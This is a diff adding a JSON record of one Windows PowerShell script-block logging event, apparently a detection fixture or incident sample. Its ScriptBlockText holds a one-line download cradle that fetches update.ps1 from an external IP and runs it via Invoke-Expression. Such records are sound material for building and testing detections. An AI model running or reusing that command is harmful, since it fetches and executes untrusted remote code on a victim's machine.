@@ -1,0 +1,37 @@
+{
+  "Event": {
+    "System": {
+      "Provider": {
+        "Name": "Microsoft-Windows-PowerShell",
+        "Guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      },
+      "EventID": 4104,
+      "Version": 1,
+      "Level": 3,
+      "Task": 2,
+      "Opcode": 15,
+      "Keywords": "0x0",
+      "TimeCreated": {
+        "SystemTime": "2026-10-22T10:17:42.184912Z"
+      },
+      "EventRecordID": 89412,
+      "Correlation": null,
+      "Execution": {
+        "ProcessID": 6412,
+        "ThreadID": 4820
+      },
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "TODD-SALES-14.harrowmere.local",
+      "Security": {
+        "UserID": "S-1-5-21-3928174412-1082938471-2948192837-1104"
+      }
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "ScriptBlockText": "$s=New-Object Net.WebClient;$s.DownloadString('http://185.22.112.14:8080/update.ps1') | IEX",
+      "ScriptBlockId": "4a7b2190-89dc-4f81-a982-19bc3e901411",
+      "Path": ""
+    }
+  }
+}
